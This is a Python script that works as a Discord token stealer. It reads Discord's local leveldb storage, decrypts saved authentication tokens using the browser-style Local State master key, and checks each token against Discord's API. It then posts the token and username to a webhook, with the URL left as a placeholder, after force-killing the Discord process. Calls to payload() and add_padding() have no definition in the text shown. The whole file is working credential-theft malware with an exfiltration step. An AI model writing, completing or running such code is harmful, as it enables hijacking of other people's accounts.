def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode('utf-8', errors='ignore')
    except:
        return ""

def get_key(path):
    if not os.path.exists(path): return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]
    except:
        return None

def get_tokens():
    all_tokens = []
    roaming = os.getenv("APPDATA")
    encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
    normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    
    # path cfg
    paths = {"Discord": roaming + "\\discord\\Local Storage\\leveldb\\"}

    for name, path in paths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        
        for file_stuff in os.listdir(path):
            if file_stuff[-3:] not in ["log", "ldb"]: continue
            try:
                with open(f"{path}\\{file_stuff}", errors="ignore") as f:
                    for line in f:
                        # handling encrypted tokens
                        for i in re.findall(encrypt_regex, line):
                            try:
                                key = get_key(roaming + f"\\{_discord}\\Local State")
                                if key:
                                    # Convert string part to bytes before base64 decode
                                    encrypted_data = i.split("dQw4w9WgXcQ:")[1].encode('utf-8')
                                    token = decrypt_val(base64.b64decode(encrypted_data), key)
                                    if token: all_tokens.append(token)
                            except: continue

                        for i in re.findall(normal_regex, line):
                            try:
                                # converting string into bytes into tokens
                                padded_i = add_padding(i).encode('utf-8')
                                decoded = base64.b64decode(padded_i).decode("utf-8", errors="ignore")
                                if len(decoded) > 20: all_tokens.append(decoded)
                            except: continue
            except: continue
    return list(set(all_tokens))

def tokens():
    for token in get_tokens():
        try:
            r = requests.get("https://discordapp.com/api/v6/users/@me", headers={"Authorization": token}, timeout=5)
            if r.status_code == 200:
                user = r.json()
                data = {"content": f"Token: {token} | User: {user.get('username')}#{user.get('discriminator')}"}
                requests.post("<webhook here>", json=data, timeout=5)
        except: pass

if __name__ == "__main__":
    # makes sure discord is killed to prevent like file locking
    os.system("taskkill /f /im Discord.exe >nul 2>&1")
    payload()
    tokens()
